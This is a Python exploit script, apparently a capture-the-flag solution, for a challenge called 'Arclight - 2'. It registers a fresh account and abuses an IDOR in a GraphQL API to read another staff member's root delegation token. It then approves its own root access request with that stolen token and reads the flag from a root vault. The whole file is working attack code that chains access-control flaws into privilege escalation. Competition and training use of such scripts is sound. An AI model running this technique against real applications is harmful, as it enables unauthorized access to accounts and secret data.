#!/usr/bin/env python3
"""Arclight - 2 full exploit, end-to-end with a fresh account."""
import json, sys, requests

BASE = "https://kicyber-c3b255e0db87-arclight2-0-0.chals.io"
s = requests.Session()
s.headers["User-Agent"] = "curl/8.5.0"

def gql(q):
    r = s.post(BASE + "/graphql", json={"query": q}, timeout=20)
    return r

user = sys.argv[1] if len(sys.argv) > 1 else "pwnbot9"

print("[1] register + login fresh account:", user)
s.post(BASE + "/register", data={"username": user, "password": "pwn123"}, allow_redirects=True, timeout=20)
s.post(BASE + "/login", data={"username": user, "password": "pwn123"}, allow_redirects=True, timeout=20)
print("    session cookie:", s.cookies.get("session"))

print("[2] current role")
print("   ", gql("{ me { username role } }").text)

print("[3] IDOR: read another staff member's delegations via staff(id:1)")
r = gql('{ staff(id: 1) { id username team delegations { id owner tier token } } }')
print("   ", r.text)
token = r.json()["data"]["staff"]["delegations"][0]["token"]

print("[4] create access request for tier=root")
r = gql('mutation { createAccessRequest(tier: "root") { id requester tier status } }')
print("   ", r.text)
rid = r.json()["data"]["createAccessRequest"]["id"]

print("[5] approve own request using the leaked root delegation token as sponsor")
r = gql('mutation { approveRequest(id: %d, sponsor: "%s") { id status } }' % (rid, token))
print("    HTTP", r.status_code, "Set-Cookie:", r.headers.get("Set-Cookie"))
print("   ", r.text)

print("[6] role after approval (server re-issued session with role=root)")
print("   ", gql("{ me { username role } }").text)

print("[7] read root vault")
r = gql("{ rootVault }")
print("   ", r.text)
print()
print("FLAG:", r.json()["data"]["rootVault"])
